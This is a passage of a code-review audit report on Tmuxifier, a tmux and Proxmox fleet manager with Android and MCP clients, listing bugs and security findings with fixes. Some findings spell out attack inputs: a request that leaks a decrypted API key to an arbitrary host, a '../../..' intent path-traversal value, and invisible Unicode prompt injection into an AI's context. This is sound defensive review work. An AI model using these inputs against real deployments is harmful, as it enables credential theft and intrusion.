|----|------|---------|----------|--------|--------------|--------|
| C1 | ssh | `gitBootstrap` (`boxActions.js:423-445`) is still an inline copy of `installPackagesBlock('git', samePkg('git'), 'git')` *(carry-forward: 2026-07-29 C3)* | Low | S | Replace with `needsGit ? installPackagesBlock('git', samePkg('git'), 'git') : []` | Open |
| C2 | jobs | Both `voiceInstall.js:81` and `apkBuild.js:64` reimplement `newestFirst` inline instead of importing `src/server/jobOrder.js` *(carry-forward: 2026-07-29 C4 + `apkBuild` twin)* | Low | S | Import `newestFirst` from `./jobOrder.js` in both modules | Open |
| C3 | scripts / services | `promptHidden` is duplicated across `scripts/hash-password.js:26-56` and `scripts/mcp-enroll.js:77-99` (sharing `B41`), and `piholeRegistry.js`/`truenasRegistry.js`/`unifiRegistry.js`/`immichRegistry.js` are four near-identical ~20-line wrappers around `createServiceClientRegistry` | Low | S | Extract `scripts/lib/promptHidden.js` (fixing `B41` once) and optionally parameterize the four `*Registry.js` wrappers | Open |

### Dead code

| ID | Area | Finding | Severity | Effort | Proposed fix | Status |
|----|------|---------|----------|--------|--------------|--------|
| D1 | web / fleet | `sameJobShape` exported from `src/web/fleetJobs.ts:122-132` has zero production callers (`main.ts:3705` rebuilds rows unconditionally via `paintJobRow`; only `test/fleetJobs.test.js:146-164` imports it) | Low | S | Either wire `sameJobShape` into `reconcileJobRows` (`main.ts:3698-3715`) to avoid redundant DOM rebuilds or remove the unused export | Open |

### Hygiene

| ID | Area | Finding | Severity | Effort | Proposed fix | Status |
|----|------|---------|----------|--------|--------------|--------|
| N1 | runtime / docs | `package.json:6-8` declares `"node": ">=20"` and `README.md:45` says `"Node 20.19+"`, whereas production runtime packages in `package-lock.json` (`cookie@2.0.1` via `@fastify/cookie`, `content-disposition@3.0.0` via `@fastify/static`) declare `"engines": { "node": ">=22" }` (and `vitest@5.0.5` requires `^22.12.0 \|\| ^24.0.0 \|\| >=26.0.0`) | Med | S | Update `package.json` `engines.node` and `README.md` prerequisites to `>=22.12.0` (or `>=22` runtime / `>=22.12` dev) | Open |
| N2 | provision | `POST /api/proxmox/provisions` (`server.js:1495-1505`) still persists `setupOptions` without running `resolveTools` validation at request time *(carry-forward: 2026-07-29 N1)* | Low | S | Validate `setupOptions` with `resolveTools` before enqueueing the provision job | Open |
| N3 | deps | `ws` still appears in both `dependencies` (`^8.21.0`, `package.json:33`) and `devDependencies` (`^8.21.1`, `package.json:49`) *(carry-forward: 2026-07-29 N2)* | Low | S | Remove `ws` from `devDependencies` and keep a single version in `dependencies` | Open |
| N4 | web | `src/web/proxmox.ts:52-60,67-68,71,75,78` and `src/web/fleetScripts.ts:30-31` interpolate `id`, `node`, and `boxId` into URL paths without `encodeURIComponent` (unlike `proxmox.ts:56,74` and `serviceIcon.ts`) | Low | S | Wrap path parameters in `encodeURIComponent(...)` consistently | Open |
| N5 | e2e | `playwright.config.ts:8-12` matches phone specs with `/(phone\|touchBar)\.spec\.ts/`, omitting `composer.spec.ts` (which passes under `desktop` only because `composer.spec.ts:11-17` overrides `viewport`/`hasTouch`/`isMobile` inline) | Low | S | Include `composer` in `PHONE_SPECS` so project routing matches its comment | Open |

### Documentation

| ID | Area | Finding | Severity | Effort | Proposed fix | Status |
|----|------|---------|----------|--------|--------------|--------|
| DOC1 | README / android | Both `README.md:215-216` and `docs/android-app.md:9-10` claim *"phone viewing can never resize your desktop windows"*, directly contradicting `docs/android-app.md:53-61` and the shipped `ensureSizedViewer` implementation (`SessionScreen.kt:138`, `server.js:1133-1135`) | Med | S | Update both intros to match `docs/android-app.md:53-61` (phone viewing attaches a temporary sizing viewer for ~30 s; desktop snaps back after exit) | Open |
| DOC2 | DEPLOY | `docs/DEPLOY.md:11-26` omits `vendor/` and six `data/` entries (`devices.json`, `mcp-token.json`, `fleet-scripts.json`, `ui-settings.json`, `apk-build-jobs.json`, `data/app/`), and *"Secrets at rest"* (`L21-26`) omits that `data/mcp-token.json` is an **unsealed** bearer token and that `TMUXIFIER_FCM_CREDENTIALS` points to a service-account private key | Med | S | Sync `DEPLOY.md` with `AGENTS.md`'s `data/` table and document `mcp-token.json` + FCM key backup/permissions | Open |
| DOC3 | configuration | `docs/configuration.md:10-60,76-83,117` omits `TMUXIFIER_CLAUDE_OAUTH_TOKEN`, `TMUXIFIER_FCM_CREDENTIALS`, `TMUXIFIER_FCM_APP_CONFIG`, and `TMUXIFIER_MCP_*`, omits `fcmCredentials`/`fcmAppConfig` from `config.json` keys, and says Settings has *"eight tabs"* (omitting **Devices**, 9th tab in `settingsUi.ts:28-41`); `.env.example:129` still says *"No notifications are sent — in-app display only"* | Low | S | Add the missing env/`config.json` entries, update Settings tab count to nine, and update `.env.example:129` to mention browser + FCM notifications | Open |
| DOC4 | scripts | `scripts/setup-voice.mjs:2-3` says *"then record both paths in .env"* and `L118` says *"Restart Tmuxifier…"*, contradicting `L109-113` (writes `data/voice.json`, live immediately with no restart) | Low | S | Update the header comment and completion message in `scripts/setup-voice.mjs` | Open |
| DOC5 | README | `README.md:155-166` Documentation table omits `[Android app](docs/android-app.md)`, `[DESIGN.md](DESIGN.md)`, and `[PRODUCT.md](PRODUCT.md)` | Low | S | Add the missing links to `README.md`'s Documentation table | Open |
| DOC6 | AGENTS / comments | `AGENTS.md` and `CLAUDE.md` omit the four `*Registry.js` wrappers (`piholeRegistry.js`, `truenasRegistry.js`, `unifiRegistry.js`, `immichRegistry.js`), the nine `src/web/settings*.ts` tab modules, and `src/web/themes/{original,vercel}.css`; `src/server/index.js:304,348` carry stale comments (*"onEvent is an unused server-push seam"* right above `fcmPush` subscribing at `L323`, and *"a pihole tile carries a sealed app password"*) | Low | S | Sync `AGENTS.md`/`CLAUDE.md` module lists and update the two comments in `src/server/index.js` | Open |

---

## Detail — High findings

### B1 — Android Console `AppState.client()` triggers an unthrottled 0 ms poll loop and OkHttp leak

`AppState.client()` (`android/app/src/main/java/com/tmuxifier/console/AppState.kt:21-25`) constructs
a brand-new `ApiClient` on every call:

```kotlin
fun client(): ApiClient? {
    val u = url ?: return null
    val t = token ?: return null
    return ApiClient(baseUrl = u, token = t, onUnauthorized = ::handleUnauthorized)
}
```

`ApiClient` (`ApiClient.kt:29-37`) is a plain class (reference-equality `equals`) whose default
parameter allocates `OkHttpClient.Builder()...build()` — a fresh `ConnectionPool` and `Dispatcher`
executor per instance. Both main screens call `val client = app.client() ?: return` at the top of
their `@Composable` body and pass `client` as a `LaunchedEffect` key (`FleetScreen.kt:47,72,84`;
`SessionScreen.kt:85,103,133`).

On iteration 1 of the poll loop, mutating Compose state (`statuses`/`cards` at
`FleetScreen.kt:100-104`, `snap`/`lines`/`reconnecting` at `SessionScreen.kt:142-145`) schedules
recomposition. Recomposition calls `app.client()`, receives a new `ApiClient` reference, and
cancels the running `LaunchedEffect(client)` while it is parked in `delay(10_000)` / `delay(1_000)`,
immediately launching a replacement coroutine that fires the next HTTP request with **zero delay**
— repeating continuously (and again on every composer keystroke, scroll, or pinch zoom in
`SessionScreen`) while abandoning unclosed `OkHttpClient` pools to GC.

### B2 — WebSocket close during pre-open `await` permanently leaks terminal and voice-link sessions

In `/term` (`src/server/server.js:1998-2162`), all three branches `await` async work **before**
attaching `socket.on('close', ...)` (`L2024`, `L2102`, `L2160`):

- Host Shell (`L1998-2026`): `await localTmuxScope.ensure(config.sessionName)` (`L2000`) runs
  before `sessions.openLocal` + `sessions.attach` (`L2013-2016`) and `socket.on('close')` (`L2024`).
- Provision (`L2030-2104`): `await store.getBox(boxId)` (`L2035`) precedes `sessions.open` +
  `sessions.attach` (`L2074-2075`) and `socket.on('close')` (`L2102`).
- Box terminal (`L2115-2162`): `await store.getBox(boxId)` (`L2115`) precedes `sessions.open` +
  `sessions.attach` (`L2136-2139`) and `socket.on('close')` (`L2160`).
- `/voice-link` (`L2174-2185`): `await store.getBox(boxId)` (`L2174`) precedes `voiceLinks.open`
  (`L2185`), which only then wires `socket.on('close')` inside `voiceLinks.js:116`.

If a browser tab closes, reloads, or loses network during that `await`, `'close'` has already
fired by the time `sessions.attach` adds `listener` to `entry.listeners` (`sessions.js:194`). The
later `socket.on('close', ...)` never fires, `sessions.detach` never runs, and `entry.listeners.size`
stays `1` forever: the `ssh` + `tmux attach` PTY never enters `graceSeconds` or exits, tmux keeps
`#{session_attached} >= 1` (permanently suppressing `agent-input` / `agent-done` notifications and
FCM pushes for that box), 8 aborted connects permanently exhaust `maxViewersPerBox` (`sessions.js:320`
reclaims only entries with `listeners.size === 0`), and `/voice-link` holds its remote writer open
until the 11-minute idle timer (`voiceLinks.js:18`).

### B3 — Multi-viewer tmux sessions report `attached: false` and fire false agent alerts

`STATUS_FMT` (`src/server/status.js:11`) queries `#{session_attached}`. In tmux (`man tmux`),
`session_attached` is *"Number of clients session is attached to"* (`0`, `1`, `2`, …), **not** a
boolean `0`/`1` flag. `parseTmuxSessions` (`status.js:249`) parses:

```js
attached: attached === '1',
```

Because Tmuxifier opens one `tmux attach-session` per viewer (`sessions.js`, keyed
`terminalKey(boxId, clientId)`), attaching a second viewer to the same session — two split panes on
the same session, two browser windows, or one desktop browser tab plus Android's invisible sizing
viewer (`ensureSizedViewer`) — raises `#{session_attached}` to `'2'`. `attached === '1'` flips to
`false`, `/api/status` reports the live session detached, and `healthHistory.js:56` sets
`sample.agentAttached = false`, firing `agent-input` / `agent-done` events and FCM push
notifications while two viewers are actively looking at the session.

### B4 — Single-box `probeOne` poisons full-fleet `proxmoxInventory.refreshLinked` via shared `inFlight`

`createProxmoxInventory` (`src/server/proxmoxInventory.js:489-493`) coalesces all `refreshLinked`
calls onto a single `inFlight` promise regardless of the `boxes` argument:

```js
function refreshLinked(boxes) {
  if (inFlight) return inFlight;
  inFlight = doRefresh(boxes).finally(() => { inFlight = null; });
  return inFlight;
}
```

`statusPoller.probeOne(boxId)` (`src/server/statusPoller.js:111-113`, wired at `index.js:341`) calls
`statusEnricher.collect([box])`, which calls `inventory.refreshLinked([box])` (`proxmoxStatus.js:28`).
`probeOne` runs whenever the user opens a pane's session dropdown (`POST /api/boxes/:id/probe`),
switches or kills a window/session, or triggers post-lifecycle `refreshUntil`. Any full-fleet
`statusPoller.pollOnce()` or `GET /api/proxmox/guests` arriving while that single-box refresh is in
flight awaits the same `inFlight` promise and gets `[recordForOneBox]`:

1. `GET /api/proxmox/guests` (`server.js:1469`) returns a 1-guest list to the Proxmox hub.
2. `statusPoller.pollOnce()` (`statusPoller.js:76-95`) builds `extra` with only that single box, so
   every other **stopped** linked container loses `proxmoxState === 'stopped'`, gets probed over SSH,
   fails with timeout/refused, and emits a false `down` health event (`healthHistory.js:18-19`),
   followed by a false `up`/recovery on the next unpoisoned sweep.

### B5 — Trailing newline in `tmuxifier-agent-hook.sh`'s `json_str()` breaks `Notification` gating

`json_str()` (`src/server/assets/tmuxifier-agent-hook.sh:34-39`) extracts string fields from hook
stdin JSON without stripping the line's trailing newline before `tr -c`:

```sh
json_str() {
  printf '%s' "$IN" \
    | sed -n 's/.*"'"$1"'"[[:space:]]*:[[:space:]]*"\([^"\\]*\)".*/\1/p' \
    | head -n 1 \
    | tr -c 'A-Za-z0-9._-' '_'
}
```

Whenever `IN` spans multiple lines under GNU `sed` — and on **every** match under POSIX/BusyBox
`sed` (e.g. Alpine boxes), which always terminates pattern-space output with `\n` — `head -n 1`
emits `idle_prompt\n`, and `tr -c 'A-Za-z0-9._-' '_'` translates `\n` into `_`, returning
`idle_prompt_` (because command substitution `$(...)` strips trailing newlines, not trailing `_`).
`EVENT` works only because `case "$EVENT"` uses prefix globs (`Notification*`), whereas line 126
uses exact `[ "$NT" = idle_prompt ] || [ "$NT" = agent_completed ]`, falling into the `*)` wildcard
branch (`L130`) that skips `busy_live` and flips the marker to `waiting` while subagents or
background Bash commands are still running.

### B6 — Saving Host Shell settings kills window 1 or bypasses `systemd-run --scope`

`localShellActions.js:12-16` builds the `PATCH /api/local-shell` script via
`buildEnsureTmuxRemote(sessionName, undefined, { installOhMyZsh/Bash: true })` without passing
`createSession: false`. At the tail of `buildEnsureTmuxRemote` (`src/server/boxActions.js:501-505`):

```sh
if ! tmux has-session -t 'local' 2>/dev/null; then
  SHELL="$ZSH_BIN" tmux new-session -d -s 'local'
elif [ -n "$TMUXIFIER_SHELL_INSTALLED" ]; then
  W=$(tmux list-windows -t 'local' -F "#{window_index}" 2>/dev/null | head -n 1)
  [ -n "$W" ] && tmux respawn-window -t 'local':$W -k "$ZSH_BIN" || true
fi
```

`TMUXIFIER_SHELL_INSTALLED=1` is set unconditionally whenever `.oh-my-zsh` / `.oh-my-bash` is
present (`boxActions.js:322,380`). Consequently:

1. If the operator already has a live Host Shell (`=local`) running Claude Code and opens Settings →
   Host Shell merely to enable *"Install Claude Code hooks and voice link"*, saving runs
   `tmux respawn-window -t 'local':$W -k`, sending `SIGKILL` to window 1's process tree.
2. `-t 'local'` omits the `=` exact-session prefix required by the repo's exact-target rule, so it
   prefix-matches `local2` when `local` is absent.
3. When `local` does not exist yet, `new-session -d -s 'local'` spawns the tmux server inside
   `tmuxifier.service`'s cgroup; `localTmuxScope.ensure` (`localTmuxScope.js:49-53`) subsequently
   sees `has-session -t '=local'` succeed and skips `systemd-run --user --scope`, so the next
   `systemctl restart tmuxifier` (`KillMode=control-group`) kills the Host Shell tmux server.

### S1 — Bearer device tokens inherit almost full operator/admin API access

`requireAuth` (`src/server/server.js:591-607`) accepts any valid `Authorization: Bearer <token>`
(Android tokens and the **plaintext** `data/mcp-token.json` token written by `npm run mcp-enroll`)
for the entire Fastify app unless an individual route opts out with `if (req.deviceId)`. Only 8
routes carry that guard (`auth/status`, `export`, `settings/ui` `PUT`, `devices` list/revoke/pair,
`apk/build`, and passkeys). Everything else is open to any Bearer device token:

- **Host command execution & writes on the Tmuxifier server:** `PATCH /api/local-shell` (runs shell
  framework/hook scripts on the host), `POST /api/upload?box=__local__` (writes files to the host),
  `POST /api/voice/install` (clones/builds native code on the host).
- **Destructive guest & box operations:** `POST /api/proxmox/lifecycle-jobs` with
  `action: 'deprovision'` (destroys the PVE container/VM and releases its IP — and
  `src/mcp/apiClient.js:159` also allows that path regex without checking `action`),
  `DELETE /api/boxes/:id`, `POST /api/boxes/:id/forget-hostkey`, `POST /api/import`.
- **Infrastructure & credential management:** `/api/proxmox/hosts*`, `/api/proxmox/presets*`,
  `/api/netbox/settings`, `/api/services*`, `/api/fleet/scripts*`.

This directly contradicts `README.md:240-241` (*"administration (credentials, deletion, deprovision)
has no code path"*) and turns a leaked `data/mcp-token.json` into full host + cluster compromise.
`requireAuth` should enforce a default-deny `(method, route)` allowlist whenever `req.deviceId` is
set.

---

## Detail — Medium findings

**B7 — Immich treats HTTP 5xx and HTML pages as `{ ok: true }`.** `createImmichClient.refresh()`
(`src/server/immichApi.js:80-109`) tags non-2xx non-401/403 statuses and non-JSON 200 responses as
`{ ok: false, kind: 'unexpected', error }` (`L84-85`), then checks only `every(... === 'unreachable')`
(`L96`) and `find(... === 'auth')` (`L99`), falling straight through to
`return { ok: true, metrics: buildMetrics({ denied: [] }) }` (`L108`). An Immich instance returning
502 Bad Gateway behind nginx or an SSO HTML login page shows green `up` on the dashboard and passes
`POST /api/services/immich/test`.

**B8 — TrueNAS WebSocket close before `'open'` hangs `serviceChecker` forever.** In
`src/server/truenasApi.js:135-156`, `s.on('close', () => { clearTimeout(timer); if (settled) teardown(undefined, s); })`
cancels the 5 s connect timer even when `!settled` without calling `finish(reject, ...)`. If a peer
closes the TCP/WS handshake cleanly before `'open'` — or `client.close()` (`L228-232`) runs while
the socket is still `CONNECTING` (for example after `/api/services/truenas/test` or `retain()` cache
eviction) — `open()` and `ready` never settle, wedging `serviceChecker.pollOnce()` (`inFlight`) for
the rest of the server process's lifetime.

**B9 — Android Keystore / Auto Backup restore crashes the app on launch.** `AndroidManifest.xml:6-13`
leaves `android:allowBackup` at its default `true` without `dataExtractionRules`/`fullBackupContent`,
backing up `auth.xml` (`EncryptedSharedPreferences` ciphertext) and plaintext `prefs.xml` (per-box
composer drafts) to Google cloud backup. On reinstall or device migration, `auth.xml` is restored
without the hardware-bound Android Keystore master key, so `TokenStore(context)` (`TokenStore.kt:13-19`)
throws `GeneralSecurityException`/`AEADBadTagException` inside `MainActivity.onCreate` (`L75`) and
`PushService.onNewToken` (`L19`), crashing every launch until app data is manually cleared.

**B10 — `/api/boxes/:id/reconnect` bypasses the running-setup gate.** `POST /api/boxes/:id/reconnect`
(`src/server/server.js:1059-1077`) neither refuses (`409`) when `setupManager.currentForBox(box.id)`
is `'running'` nor passes `'terminal'` to `sessions.closeGroup(box.id)` (compare `PATCH /api/boxes/:id`
at `L858`). Firing Reconnect mid-setup tears down the shared ControlMaster (`exitMaster`) underneath
the running setup stream or kills an active `mode=provision` interactive password/sudo session.

**B11 — Readdress restart leaks `oldNetboxIpId` and misidentifies the live IP as orphaned.** In
`src/server/proxmoxLifecycle.js:352-377`, `boxStore.readdressBox(job.boxId, { host: newHost, netboxIpId: res.id })`
(`L356`) overwrites the box's stored `netboxIpId` before the `release` phase (`L364-368`) deletes
`oldNetboxIpId`. If the server restarts during `release`, boot reconciliation (`L61`) has no
`oldNetboxIpId` to release, while `chaseable` (`L466`, which covers every phase after `allocate`
including `verify`!) appends a warning naming `job.netboxIpId` — the **new** IP the container and
box now actively use — as potentially unused. In addition, `L343` and `L373` call
`knownHosts.forget` even when `newHost === oldAddr` (`keepId` VLAN/CIDR-only edits).

**B12 — `auto-static` provisioning skips host-uniqueness check until after building the guest and
forgetting `known_hosts`.** For `auto-static` presets, pre-flight `uniquenessConflict`
(`proxmoxProvision.js:220`) has only `{ label: hostname }`. Once `netbox.allocateIp` returns
`res.address` (`L137`), `run()` neither validates `isIp(res.gateway)` (`L138`) nor checks
`boxStore.uniquenessConflict({ host: boxHost })` before creating and starting the container
(`L148-175`) and calling `knownHosts.forget(boxHost)` (`L179`). If NetBox allocates an IP that an
existing box in `boxes.json` still references, Tmuxifier provisions a colliding container on that
IP, deletes the existing box's `known_hosts` key, and only then fails at `boxStore.addBox` (`L181`).

**B13 — Fleet `cancelJob` races initial workers and mislabels cancelled targets `'error'`.**
`cancelJob(id)` (`src/server/fleet.js:203-208`) adds `id` to `cancelled` without mutating `pending`
targets. When `run()` resumes after `await new Promise((r) => setTimeout(r, 0))` (`L100`), each
worker checks `if (t.status === 'cancelled') return;` (`L103`) — still `'pending'` — and does not
re-check `cancelled.has(job.id)` after `await masterAlive(box)` (`L109`), executing `execCommand`
on up to `concurrency` boxes anyway, while `finalize` (`L84-90`) marks untouched `pending` targets
`status: 'error', error: 'did not run'` instead of `'cancelled'`.

**B14 — `boxActions.js` rc/tmux dedup deletes the user's last line when trailing `\n` is absent.**
`LOCAL_BIN_PATH_BLOCK` (`src/server/boxActions.js:256-264`) and `.tmux.conf.local` setup
(`L358-360, 412-414`) run `sed -i '/# tmuxifier-local-bin$/d'` and append their tagged line with
`printf '%s\n' ... >> "$rc"` without first checking `tail -c 1 "$rc"` (unlike `aiAuthSeed.js:40`).
If the file lacked a trailing newline, the first setup appends onto the operator's last line, and
the next setup's `sed -i` deletes the entire combined line.

**B15 — `pinnedSocket` leaves its handshake `'timeout'` listener attached.** `src/server/tlsPin.js:50-53`
resets `socket.setTimeout(0)` once the fingerprint matches, but leaves
`socket.on('timeout', () => fail(new Error('TLS connection timed out')))` registered. When a
downstream caller (`proxmoxApi.js`, `netboxApi.js`, `unifiApi.js`) sets an HTTP request timeout on
that socket and a slow API call trips it, `pinnedSocket`'s listener fires alongside the request's
own handler and destroys the socket with `'TLS connection timed out'`.

**B16 — Malformed row in `data/health-events.json` crashes boot.** `createHealthHistory`
(`src/server/healthHistory.js:186-188,245`) loads `health-events.json` via `jsonFile.js` (which
checks only `Array.isArray`) and immediately evaluates
`events.reduce((m, e) => Math.max(m, e.seq || 0), 0)` at top-level startup (`index.js:306`). A
`[null]` entry throws `TypeError` before the server listens — the `2026-07-29 B10` bug class.

**B17 — Editing a service's `check.kind` leaves a zombie duplicate card on the dashboard.**
`src/web/dashboard.ts:501-538,650-666` maintains five element caches (`tileEls`, `cardEls`,
`truenasEls`, `unifiEls`, `immichEls`), all keyed by `svc.id`, and prunes each cache with
`if (!tilesSeen.has(id))`. Switching a tile's `check.kind` across renderers (for example `http` →
`pihole` or `unifi` → `http`) inserts a new element into the new cache while `tilesSeen.has(svc.id)`
keeps the old cache's DOM node alive in `.dash-services` until a full page reload.

**B18 — Missing Meslo font pins and off-screen focus trap in `style.css`.** Under both `vercel`
(the default theme) and `original`, `--face` is a proportional sans font (`'Geist'` / `system-ui`),
not the bundled Nerd Font. `.event-icon` (`src/web/style.css:1780`) and `.clawd` (`L568-572`) do
not override `font-family`, so every Nerd Font PUA icon in the Events drawer (`healthEvents.ts:50-67`)
renders as tofu (`□`) and the block-element Clawd sprite misaligns; `.provision-log` (`L1423`) also
inherits `--face` instead of `var(--face-code)`. Separately, `.provision-panel` (`L1354-1371`)
slides off-screen via `transform: translateX(100%)` without `visibility: hidden` (unlike `.fleet-panel`
at `L1626-1632`), keeping its buttons in the keyboard Tab ring while closed.

**B19 — Unregistered `mount: app` modals leak document listeners and collide on nested `Escape`.**
`openLocalShellEditModal` (`main.ts:2266`), `openFleetConfirm` (`L3196`), `openFleetScriptModal`
(`L3326`), and `confirmDiscard` (`L3375`) mount onto `#app` without calling `registerModal(close)`
(exempted by `test/modalRegistration.test.js:17-20`). When `teardownWorkspace()` wipes
`#app.innerHTML` on logout or 401 expiry, their `onClose` callbacks never run, leaking `document`
`keydown` listeners (`Ctrl+S`/`Ctrl+Enter` still fire `/api/fleet/*` from the login screen!),
`openBackdrops` entries, `rail`, and CodeMirror. Worse, while `confirmDiscard` (`L3375`) is open
inside `openFleetScriptModal`, pressing `Escape` runs the parent editor's `document` `keydown`
handler (`L3418-3422`) too, closing **both** modals and discarding the script. Pre-open async
fetches in `openBoxDialog` (`L2478`) and `openLocalShellEditModal` (`L2218`) also swallow 401s and
mount modals onto `#app` after `teardownWorkspace()` has rendered the login form.

**B20 — Fresh password/passkey logins skip `api.uiConfig()`.** `start()` (`src/web/main.ts:416-425`)
fetches `api.uiConfig()` and applies `setTerminalFont` + `setTerminalUploads` only when a session
is already valid on page load. Both `loginForm` (`L516`) and `passkeyBtn` (`L538-542`) call
`loadUiSettings()` + `renderDashboard()` without `api.uiConfig()`, leaving custom terminal font and
upload-size limits unapplied until the user reloads the tab.

**B21 — Mic press records into a guaranteed discard when dictation is disabled.** `reducePress`
(`src/web/voicePress.ts:36-64`) has no `dictationEnabled` parameter. When `cfg.voice === false`
(voice button shown solely for Claude Code `/voice` links), pressing the mic on a non-Claude pane —
or on a Claude pane whose `/voice-link` closes `4002` — transitions to `'recording'` (`● rec`) and
captures microphone audio up to `maxSeconds`, only to throw it away in `finishDictation`
(`voiceUi.ts:335-339`) with *"dictation is not enabled"*. Also `voiceRecorder.ts:51-65` does not
check `stopped` after `await getUserMedia` / `await addModule`, and `finishDictation` (`L327-369`)
does not guard against pane disposal during `await api.postVoice`.

**B22 — `npm run dev` omits the `/voice-link` WebSocket proxy.** `vite.config.ts:29-33` forwards
`/api` and `/term` to the backend port, but not `/voice-link`, so opening a Claude Code voice link
against the Vite dev server fails immediately.

**B23 — MCP IPv6 URL formatting and `caFile` origin check.** `src/mcp/config.js:24-26` checks
`WILDCARD_BINDS = new Set(['0.0.0.0', '::', ''])` and formats `host.includes(':') ? `[${host}]` : host`.
If `bindAddress` is already bracketed (`[::1]` or `[::]`), it misses `WILDCARD_BINDS` and produces
`https://[[::1]]:7437`, throwing `ERR_INVALID_URL` on every call; and `baseUrl === configUrl`
(`L44`) drops `caFile` whenever `TMUXIFIER_MCP_URL` differs only by default port or `localhost` vs
`127.0.0.1`.

**B24 — MCP tool input validation and `setup_options` schema split.** In `src/mcp/tools.js`:
`wait_for_agent` (`L114-135`) and `box_health` (`L172-182`) never verify `box_id` exists
(`GET /api/health/series?box=<unknown>` returns `200 {}`), causing `wait_for_agent` to hang up to
540 s on a typo (or resolve immediately on `until: ['gone']`), and `until: []` loops until timeout;
`job_status` (`L146`, `shape.js:119`) accepts `limit <= 0`; and `provision_guest` (`L224-229`)
forwards `setup_options` raw (expecting camelCase `ohMyZsh`, `seedAiAuth`, `scriptId` with no
`SETUP_TOOLS` check) whereas `start_setup` (`L197-212`) exposes snake_case (`oh_my_zsh`,
`seed_ai_auth`, `script_id`) with `SETUP_TOOLS` enum validation.

**B25 — MCP stdio stream safety, `stdin` EOF hang, and unbounded buffers.** `src/mcp/index.js:15`
redirects `console.log` to `stderr` so logs cannot corrupt JSON-RPC `stdout`, but leaves
`console.info` and `console.debug` bound to `stdout`. Closing `stdin` while `wait_for_agent` /
`wait_for_job` is sleeping leaves `tools.js:16`'s `setTimeout` holding the Node process open for up
to 540 s. Finally, neither `jsonrpc.js:17` (`buf += chunk`) nor `apiClient.js:77` (`chunks.push(c)`)
caps buffered bytes, and `req.setTimeout` (`apiClient.js:85`) bounds socket idle time rather than
total request duration.

**S2 — Android `MainActivity` intent `boxId` path traversal and OkHttp redirect credential forwarding.**
`MainActivity` is exported (`AndroidManifest.xml:13`) and reads `intent?.getStringExtra("boxId")` in
`onCreate` and `onNewIntent` (`MainActivity.kt:76,107,158-162`), opening `SessionScreen(boxId)` with
no character validation. `ApiClient.kt:80-126` interpolates `$boxId` directly into URL strings
(`"/api/boxes/$boxId/pane..."`, `"/api/boxes/$boxId/keys"`, etc.), so any local app firing an
explicit `Intent` with `boxId = "../../..."` triggers authenticated `GET`/`POST` requests to
arbitrary `/api/*` paths. Separately, `OkHttpClient` (`ApiClient.kt:33`) leaves `followRedirects`
and `followSslRedirects` at their `true` defaults instead of failing closed on redirects.

**S3 — Service and NetBox test routes allow cross-kind cleartext credential exfiltration.**
*(Widened from 2026-07-29 S7.)* All four `/api/services/{pihole,truenas,unifi,immich}/test` routes
(`src/server/server.js:1263-1364`) call `servicesStore.getServiceSecret(b.id)` whenever the request
omits a secret, without checking that `b.id`'s stored `check.kind` matches the route or that `b.url`
matches the stored service's scheme and host. While `2026-07-29 S3` dropped sealed secrets on kind
changes in `servicesStore`, calling `POST /api/services/pihole/test` or `/api/services/immich/test`
with `{ id: <unifiOrTruenasTileId>, url: "http://192.0.2.99/" }` decrypts the HTTPS-only UniFi or
TrueNAS API key and transmits it in **cleartext HTTP** to an arbitrary host (`POST /api/netbox/test`
at `L1654-1675` has the identical arbitrary-URL + `http://` downgrade gap for the stored NetBox
token).

**S4 — MCP output sanitization omits `INVISIBLE` in `read_pane` and all stripping in `job_status`.**
`src/mcp/shape.js:8-12` defines `INVISIBLE` (`\p{Cf}`, `\p{Cs}`, and Unicode Tags
`U+E0000–U+E007F`, a known LLM invisible-ASCII prompt-injection vector) and applies it in
`untrustedText()` for `list_boxes`. However, `stripSgr()` (`L38-41`, used by `read_pane`) strips
only CSI/OSC/C0 controls and leaves `INVISIBLE` untouched in terminal pane text fed directly into
Claude's context; and `clip()` (`L23,123-137`, used for Fleet `stdout`/`stderr` and setup/provision/
lifecycle logs in `job_status` and `wait_for_job`) strips neither terminal escapes nor `INVISIBLE`.

**S5 — Host Shell `openLocal` bypasses `maxViewersPerBox`.** `sessions.open` enforces
`assertViewerRoom(box.id)` (`maxViewersPerBox = 8`, `src/server/sessions.js:108,315-327`), whereas
`sessions.openLocal` (`L149-179`) omits that check entirely — allowing an authenticated caller (or
leaked session) to spawn unbounded local PTYs on the Tmuxifier host by varying the 64-char `client`
query parameter on `/term?box=__local__`.

**S6 — `proxmoxValidate.js` `isIp` accepts leading-zero octal IPv4 octets.** `isIp`
(`src/server/proxmoxValidate.js:22-25`) tests `/^\d{1,3}$/` + `Number(p) <= 255`, accepting
`192.0.2.050`. `node:net`'s `isIP('192.0.2.050')` returns `0` (so `knownHosts.js:19` treats it as a
non-IP), while glibc/OpenSSH `inet_aton` parses `050` as **octal `40`** (`192.0.2.40`), causing SSH
to connect to a different IP address than the decimal string validated and displayed.

**N1 — Node engine floor in `package.json` and `README.md` lags production dependencies.**
`package.json:6-8` declares `"engines": { "node": ">=20" }` and `README.md:45` states `"Node 20.19+
(the vite 8 build needs it; running the test suite needs 22.12+)"`, but production runtime packages
installed in `package-lock.json` (`cookie@2.0.1` via `@fastify/cookie`, `content-disposition@3.0.0`
via `@fastify/static`) declare `"engines": { "node": ">=22" }`.

**DOC1–DOC2 — Android window-sizing contradiction and `DEPLOY.md` runtime/secret drift.** Both
`README.md:215-216` and `docs/android-app.md:9-10` still state that phone viewing never attaches a
tmux client and can never resize desktop windows, contradicting `docs/android-app.md:53-61` and the
shipped `ensureSizedViewer` behavior. Meanwhile `docs/DEPLOY.md:11-26` omits `vendor/` and six newer
`data/` artifacts — most importantly `data/mcp-token.json`, which holds a **plaintext** bearer token
unaffected by `TMUXIFIER_COOKIE_SECRET` rotation.

---

## What was verified clean

Recorded deliberately: these areas were read end-to-end across all ten review tracks and found
sound, making the findings above bounded exceptions rather than a sample.

- **Browser authentication, WebAuthn, pairing codes, and rate limiting.** Scrypt password
  verification uses `timingSafeEqual`; signed `tmuxifier_session` cookies enforce TTL and the
  logout revocation watermark across REST and both WebSockets (`/term`, `/voice-link`);
  `requireTrustedOrigin` guards mutating REST routes and WS upgrades; WebAuthn enforces bounded
  CBOR/COSE parsing, `none` attestation, RP ID pinning, `passkeyOnly` lockout guards, and per-owner
  challenge quotas; pairing codes are browser-session-only, 120 s TTL, `<= 4` outstanding, single-use;
  device tokens store SHA-256 digests only and compare via `timingSafeEqual`.
- **Cryptography, secret redaction, and AI credential seeding.** `secretBox` uses AES-256-GCM with
  random 12-byte IVs, 16-byte tags, and HKDF-derived keys. Proxmox, NetBox, and Services stores
